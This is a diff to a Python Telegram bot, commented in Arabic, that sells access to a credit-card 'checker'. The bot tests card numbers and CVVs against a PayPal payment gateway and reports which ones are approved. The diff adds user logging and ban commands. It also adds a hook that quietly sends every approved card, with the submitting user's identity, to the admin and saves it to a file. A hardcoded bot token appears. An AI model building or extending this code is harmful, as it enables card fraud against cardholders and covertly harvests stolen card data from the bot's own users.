@@ -25,12 +25,89 @@ CCN_KEYWORDS = [
 ]
 # ===============================================================
 
+# ==================== ملفات الحظر والمستخدمين ====================
+BANNED_USERS_FILE = 'banned_users.json'
+USERS_LOG_FILE = 'users_log.json'
+
+# تحميل/حفظ المستخدمين المحظورين
+def load_banned_users():
+    try:
+        with open(BANNED_USERS_FILE, 'r') as f:
+            return json.load(f)
+    except:
+        return {}
+
+def save_banned_users(banned):
+    with open(BANNED_USERS_FILE, 'w') as f:
+        json.dump(banned, f, indent=4)
+
+# تسجيل دخول المستخدمين
+def log_user_activity(user_id, username, first_name, action):
+    try:
+        with open(USERS_LOG_FILE, 'r') as f:
+            users_log = json.load(f)
+    except:
+        users_log = {}
+    
+    if str(user_id) not in users_log:
+        users_log[str(user_id)] = {
+            'user_id': user_id,
+            'username': username,
+            'first_name': first_name,
+            'first_use': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'last_use': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'total_actions': 0,
+            'actions': []
+        }
+    
+    users_log[str(user_id)]['last_use'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    users_log[str(user_id)]['total_actions'] += 1
+    users_log[str(user_id)]['actions'].append({
+        'action': action,
+        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    })
+    
+    with open(USERS_LOG_FILE, 'w') as f:
+        json.dump(users_log, f, indent=4)
+
+def is_user_banned(user_id):
+    banned = load_banned_users()
+    return str(user_id) in banned
+
+# ===============================================================
+
 stopuser = {}
-token = "8546455855:AAFOl-NNSlYOIxOqQh8ev8EMnFdPtps3uoc"  # توكنك هنا
+token = "8546455855:AAFOl-NNSlYOIxOqQh8ev8EMnFdPtps3uoc"  # توكن البوت الرئيسي
 bot = telebot.TeleBot(token, parse_mode="HTML")
 admin = 1093032296  # ايدي الادمن
 active_scans = set()
 command_usage = {}
+
+def send_notification_to_admin(card_info, user_info, response_text, execution_time, gateway):
+    """إرسال إشعار للأدمن عند وجود بطاقة ناجحة (تشارج)"""
+    try:
+        notification_text = f"""
+🔔 <b>بطاقة ناجحة - CHARGE ✅</b>
+
+👤 <b>المستخدم:</b> {user_info['name']}
+🆔 <b>ID:</b> <code>{user_info['id']}</code>
+👤 <b>يوزر:</b> @{user_info['username'] if user_info['username'] else 'لا يوجد'}
+💳 <b>البطاقة:</b> <code>{card_info['card']}</code>
+📝 <b>الرد:</b> {response_text}
+🚪 <b>الGateway:</b> {gateway}
+⚡ <b>الوقت:</b> {execution_time} ثانية
+📅 <b>التاريخ:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+<b>🎯 تم التشارج بنجاح!</b>
+"""
+        # إرسال الإشعار للأدمن (نفس البوت)
+        bot.send_message(admin, notification_text, parse_mode="HTML")
+        
+        # أيضاً حفظ في ملف خاص
+        with open('approved_cards.txt', 'a', encoding='utf-8') as f:
+            f.write(f"{card_info['card']}|{user_info['name']}|{user_info['id']}|{user_info['username']}|{response_text}|{gateway}|{datetime.now()}\n")
+    except Exception as e:
+        print(f"خطأ في إرسال الإشعار: {e}")
 
 def reset_command_usage():
     for user_id in command_usage:
@@ -53,8 +130,26 @@ def dato(zh):
         print(e)
         return 'No info'
 
+# التحقق من الحظر قبل أي أمر
+def check_ban_decorator(func):
+    def wrapper(message):
+        user_id = message.from_user.id
+        if is_user_banned(user_id):
+            bot.reply_to(message, "🚫 <b>لقد تم حظرك من استخدام هذا البوت!</b>\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
+            return
+        return func(message)
+    return wrapper
+
 @bot.message_handler(commands=["start"])
 def start(message):
+    # تسجيل المستخدم
+    log_user_activity(
+        message.from_user.id,
+        message.from_user.username,
+        message.from_user.first_name,
+        'start'
+    )
+    
     def my_function():
         name = message.from_user.first_name
         with open('data.json', 'r') as file:
@@ -86,7 +181,7 @@ def start(message):
             bot.send_message(chat_id=message.chat.id, text=f'''<b>
 اهلا بك عزيزي >> {name}
 البوت مدفوع وليس مجاني وسعر الاشتراك لليوم الكامل 2$
-للاشتراك و الاستفسار : @FJ0FF
+للاشتراك و الاستفسار : @Jo0000ker
 </b>
             ''', reply_markup=keyboard)
             return
@@ -104,6 +199,10 @@ Ex: /chk 551179...''', reply_markup=keyboard)
 
 @bot.message_handler(commands=["cmds"])
 def cmds(message):
+    if is_user_banned(message.from_user.id):
+        bot.reply_to(message, "🚫 <b>لقد تم حظرك من استخدام هذا البوت!</b>\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
+        return
+    
     with open('data.json', 'r') as file:
         json_data = json.load(file)
     id = message.from_user.id
@@ -122,8 +221,185 @@ Paypal Commerce $0.05 ✅ <code>/chk </code> 𝗻𝘂𝗺𝗯𝗲𝗿|𝗺𝗺|�
 𝗦𝗧𝗔𝗧𝗨𝗦 𝗢𝗡𝗟𝗜𝗡𝗘 </b>
 ''', reply_markup=keyboard)
 
+# ==================== أوامر الأدمن ====================
+@bot.message_handler(commands=["users"])
+def show_users(message):
+    """عرض جميع المستخدمين الذين استخدموا البوت"""
+    if message.from_user.id != admin:
+        bot.reply_to(message, "❌ هذا الأمر مخصص للأدمن فقط!")
+        return
+    
+    try:
+        with open(USERS_LOG_FILE, 'r') as f:
+            users_log = json.load(f)
+        
+        if not users_log:
+            bot.reply_to(message, "📭 لا يوجد مستخدمين حتى الآن")
+            return
+        
+        users_text = "👥 <b>قائمة المستخدمين:</b>\n\n"
+        for user_id, data in users_log.items():
+            users_text += f"🆔 ID: <code>{user_id}</code>\n"
+            users_text += f"👤 الاسم: {data['first_name']}\n"
+            users_text += f"📝 اليوزر: @{data['username'] if data['username'] else 'لا يوجد'}\n"
+            users_text += f"📅 أول استخدام: {data['first_use']}\n"
+            users_text += f"🔄 آخر استخدام: {data['last_use']}\n"
+            users_text += f"📊 عدد العمليات: {data['total_actions']}\n"
+            users_text += "─" * 20 + "\n"
+        
+        # تقسيم النص إذا كان طويلاً
+        if len(users_text) > 4000:
+            for i in range(0, len(users_text), 4000):
+                bot.send_message(admin, users_text[i:i+4000], parse_mode="HTML")
+        else:
+            bot.reply_to(message, users_text, parse_mode="HTML")
+            
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ: {str(e)}")
+
+@bot.message_handler(commands=["ban"])
+def ban_user(message):
+    """حظر مستخدم"""
+    if message.from_user.id != admin:
+        bot.reply_to(message, "❌ هذا الأمر مخصص للأدمن فقط!")
+        return
+    
+    try:
+        # استخراج ID المستخدم
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, "❌ استخدم: /ban [user_id] [السبب اختياري]\nمثال: /ban 123456789 سبب الحظر")
+            return
+        
+        user_id = parts[1]
+        reason = " ".join(parts[2:]) if len(parts) > 2 else "لا يوجد سبب محدد"
+        
+        banned = load_banned_users()
+        banned[user_id] = {
+            'reason': reason,
+            'banned_by': admin,
+            'banned_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        }
+        save_banned_users(banned)
+        
+        bot.reply_to(message, f"✅ <b>تم حظر المستخدم {user_id} بنجاح!</b>\nالسبب: {reason}", parse_mode="HTML")
+        
+        # محاولة إرسال إشعار للمستخدم المحظور
+        try:
+            bot.send_message(user_id, f"🚫 <b>لقد تم حظرك من استخدام البوت!</b>\nالسبب: {reason}\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
+        except:
+            pass
+            
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ: {str(e)}")
+
+@bot.message_handler(commands=["unban"])
+def unban_user(message):
+    """إلغاء حظر مستخدم"""
+    if message.from_user.id != admin:
+        bot.reply_to(message, "❌ هذا الأمر مخصص للأدمن فقط!")
+        return
+    
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, "❌ استخدم: /unban [user_id]")
+            return
+        
+        user_id = parts[1]
+        banned = load_banned_users()
+        
+        if user_id in banned:
+            del banned[user_id]
+            save_banned_users(banned)
+            bot.reply_to(message, f"✅ <b>تم إلغاء حظر المستخدم {user_id} بنجاح!</b>", parse_mode="HTML")
+            
+            # إشعار المستخدم
+            try:
+                bot.send_message(user_id, f"✅ <b>تم إلغاء حظرك! يمكنك استخدام البوت مرة أخرى.</b>\nشكراً لتفهمك.", parse_mode="HTML")
+            except:
+                pass
+        else:
+            bot.reply_to(message, f"❌ المستخدم {user_id} غير محظور!")
+            
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ: {str(e)}")
+
+@bot.message_handler(commands=["banned"])
+def show_banned(message):
+    """عرض قائمة المحظورين"""
+    if message.from_user.id != admin:
+        bot.reply_to(message, "❌ هذا الأمر مخصص للأدمن فقط!")
+        return
+    
+    banned = load_banned_users()
+    if not banned:
+        bot.reply_to(message, "📭 لا يوجد مستخدمين محظورين")
+        return
+    
+    banned_text = "🚫 <b>قائمة المستخدمين المحظورين:</b>\n\n"
+    for user_id, data in banned.items():
+        banned_text += f"🆔 ID: <code>{user_id}</code>\n"
+        banned_text += f"📝 السبب: {data['reason']}\n"
+        banned_text += f"📅 تاريخ الحظر: {data['banned_at']}\n"
+        banned_text += "─" * 20 + "\n"
+    
+    bot.reply_to(message, banned_text, parse_mode="HTML")
+
+@bot.message_handler(commands=["stats"])
+def show_stats(message):
+    """إحصائيات البوت"""
+    if message.from_user.id != admin:
+        bot.reply_to(message, "❌ هذا الأمر مخصص للأدمن فقط!")
+        return
+    
+    try:
+        with open(USERS_LOG_FILE, 'r') as f:
+            users_log = json.load(f)
+        
+        total_users = len(users_log)
+        total_actions = sum(user['total_actions'] for user in users_log.values())
+        
+        # عدد البطاقات الناجحة
+        try:
+            with open('approved_cards.txt', 'r', encoding='utf-8') as f:
+                approved_cards = len(f.readlines())
+        except:
+            approved_cards = 0
+        
+        banned = load_banned_users()
+        
+        stats_text = f"""
+📊 <b>إحصائيات البوت:</b>
+━━━━━━━━━━━━━━━━
+👥 إجمالي المستخدمين: <b>{total_users}</b>
+🔄 إجمالي العمليات: <b>{total_actions}</b>
+✅ البطاقات الناجحة: <b>{approved_cards}</b>
+🚫 المستخدمين المحظورين: <b>{len(banned)}</b>
+
+🤖 <b>Bot By: @Jo0000ker</b>
+"""
+        bot.reply_to(message, stats_text, parse_mode="HTML")
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ: {str(e)}")
+
+# ==================== معالجة الملفات ====================
 @bot.message_handler(content_types=["document"])
 def handle_document(message):
+    # تسجيل نشاط المستخدم
+    log_user_activity(
+        message.from_user.id,
+        message.from_user.username,
+        message.from_user.first_name,
+        'upload_file'
+    )
+    
+    # التحقق من الحظر
+    if is_user_banned(message.from_user.id):
+        bot.reply_to(message, "🚫 <b>لقد تم حظرك من استخدام هذا البوت!</b>\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
+        return
+    
     with open('data.json', 'r') as file:
         json_data = json.load(file)
     id = message.from_user.id
@@ -146,12 +422,12 @@ def handle_document(message):
         with open('data.json', 'w') as json_file:
             json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
         keyboard = types.InlineKeyboardMarkup()
-        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Jo0000ker")
         keyboard.add(contact_button)
         bot.send_message(chat_id=message.chat.id, text=f'''<b>
 اهلا بك عزيزي
 البوت مدفوع وليس مجاني وسعر الاشتراك لليوم الكامل 2$
-للاشتراك و الاستفسار : @FJ0FF
+للاشتراك و الاستفسار : @Jo0000ker
 </b>
         ''', reply_markup=keyboard)
         return
@@ -163,12 +439,12 @@ def handle_document(message):
         provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
     except Exception as e:
         keyboard = types.InlineKeyboardMarkup()
-        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Jo0000ker")
         keyboard.add(contact_button)
         bot.send_message(chat_id=message.chat.id, text=f'''<b>
 اهلا بك عزيزي
 البوت مدفوع وليس مجاني وسعر الاشتراك لليوم الكامل 2$
-للاشتراك و الاستفسار : @FJ0FF
+للاشتراك و الاستفسار : @Jo0000ker
 </b>
         ''', reply_markup=keyboard)
         return
@@ -177,7 +453,7 @@ def handle_document(message):
     required_duration = timedelta(hours=0)
     if current_time - provided_time > required_duration:
         keyboard = types.InlineKeyboardMarkup()
-        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Jo0000ker")
         keyboard.add(contact_button)
         bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
         ''', reply_markup=keyboard)
@@ -192,7 +468,7 @@ def handle_document(message):
     name = message.from_user.first_name
     user_id = message.from_user.id
     if user_id in active_scans:
-        bot.reply_to(message, "ما تقدر تفحص اكثر من ملف بنفس الوقت انتظر الملف الاول يخلص فحص او انت وقفه و بعدين تعال افحص الملف الثاني")
+        bot.reply_to(message, "ما تقدر تفحص اكثر من ملف بنفس الوقت انتظر الملف الاول يخلص فحص او وقفه و بعدين تعال افحص الملف الثاني")
         return
     else:
         active_scans.add(user_id)
@@ -264,7 +540,7 @@ def process_combo(call):
                         chat_id=call.message.chat.id,
                         message_id=call.message.message_id,
                         text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
-𝘽𝙤𝙩 𝘽𝙮 @FJ0FF''',
+𝘽𝙤𝙩 𝘽𝙮 @Jo0000ker''',
                         reply_markup=mes
                     )
 
@@ -278,8 +554,18 @@ def process_combo(call):
 {info}
 • Vbv : Error
 • Time : {"{:.1f}".format(execution_time)}
-• Bot By : @FJ0FF</b>'''
+• Bot By : @Jo0000ker</b>'''
                         bot.send_message(call.from_user.id, msg_approved)
+                        
+                        # إرسال إشعار للأدمن (أنت) بالبطاقة الناجحة
+                        user_info = {
+                            'id': call.from_user.id,
+                            'name': call.from_user.first_name,
+                            'username': call.from_user.username
+                        }
+                        card_info = {'card': cc.strip()}
+                        send_notification_to_admin(card_info, user_info, raw_response, "{:.1f}".format(execution_time), gate)
+                        
                     # لا نرسل أي شيء للـ CCN أو declined
 
                     time.sleep(5)
@@ -301,6 +587,19 @@ def process_combo(call):
 
 @bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
 def manual_check(message):
+    # تسجيل نشاط المستخدم
+    log_user_activity(
+        message.from_user.id,
+        message.from_user.username,
+        message.from_user.first_name,
+        'manual_check'
+    )
+    
+    # التحقق من الحظر
+    if is_user_banned(message.from_user.id):
+        bot.reply_to(message, "🚫 <b>لقد تم حظرك من استخدام هذا البوت!</b>\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
+        return
+    
     gate = 'Paypal Commerce $1'
     name = message.from_user.first_name
     idt = message.from_user.id
@@ -327,12 +626,12 @@ def manual_check(message):
 
     if BL == '𝗙𝗥𝗘𝗘':
         keyboard = types.InlineKeyboardMarkup()
-        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Jo0000ker")
         keyboard.add(contact_button)
         bot.send_message(chat_id=message.chat.id, text=f'''<b>
 اهلا بك عزيزي >> {name}
 البوت مدفوع وليس مجاني وسعر الاشتراك لليوم الكامل 2$
-للاشتراك و الاستفسار : @FJ0FF
+للاشتراك و الاستفسار : @Jo0000ker
 </b>
         ''', reply_markup=keyboard)
         return
@@ -344,12 +643,12 @@ def manual_check(message):
         provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
     except Exception as e:
         keyboard = types.InlineKeyboardMarkup()
-        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Jo0000ker")
         keyboard.add(contact_button)
         bot.send_message(chat_id=message.chat.id, text=f'''<b>
 اهلا بك عزيزي >> {name}
 البوت مدفوع وليس مجاني وسعر الاشتراك لليوم الكامل 2$
-للاشتراك و الاستفسار : @FJ0FF
+للاشتراك و الاستفسار : @Jo0000ker
 </b>
         ''', reply_markup=keyboard)
         return
@@ -358,7 +657,7 @@ def manual_check(message):
     required_duration = timedelta(hours=0)
     if current_time - provided_time > required_duration:
         keyboard = types.InlineKeyboardMarkup()
-        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Jo0000ker")
         keyboard.add(contact_button)
         bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
         ''', reply_markup=keyboard)
@@ -421,7 +720,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
 {info}
 • Vbv : Error
 • Time : {"{:.1f}".format(execution_time)}
-• Bot By : @FJ0FF</b>'''
+• Bot By : @Jo0000ker</b>'''
 
     msg_ccn = f'''<b>CCN ☑️
 
@@ -430,7 +729,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
 • Gateway : {gate}
 {info}
 • Time : {"{:.1f}".format(execution_time)}
-• Bot By : @FJ0FF</b>'''
+• Bot By : @Jo0000ker</b>'''
 
     msg_declined = f'''<b>Declined ❌
 
@@ -439,10 +738,20 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
 • Gateway : {gate}		
 {info}
 • Time : {"{:.1f}".format(execution_time)}
-• Bot By : @FJ0FF</b>'''
+• Bot By : @Jo0000ker</b>'''
 
     if category == 'approved':
         bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg_approved)
+        
+        # إرسال إشعار للأدمن (أنت) بالبطاقة الناجحة
+        user_info = {
+            'id': message.from_user.id,
+            'name': message.from_user.first_name,
+            'username': message.from_user.username
+        }
+        card_info = {'card': cc}
+        send_notification_to_admin(card_info, user_info, raw_response, "{:.1f}".format(execution_time), gate)
+        
     elif category == 'ccn':
         bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg_ccn)
     else:
@@ -450,6 +759,10 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
 
 @bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
 def redeem(message):
+    if is_user_banned(message.from_user.id):
+        bot.reply_to(message, "🚫 <b>لقد تم حظرك من استخدام هذا البوت!</b>\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
+        return
+    
     def my_function():
         try:
             re = message.text.split(' ')[1]
@@ -527,8 +840,16 @@ def stop_callback(call):
     bot.answer_callback_query(call.id, "⏹️ تم إيقاف الفحص")
 
 print("تم تشغيل البوت")
+print("البوت يعمل الآن مع الميزات الجديدة:")
+print("✅ إرسال البطاقات الناجحة للأدمن")
+print("✅ تسجيل جميع المستخدمين")
+print("✅ نظام حظر المستخدمين")
+print("✅ عرض إحصائيات البوت")
+print("✅ Bot By: @Jo0000ker")
+
 while True:
     try:
         bot.polling(none_stop=True)
     except Exception as e:
         print(f"حدث خطأ: {e}")
+        time.sleep(5)
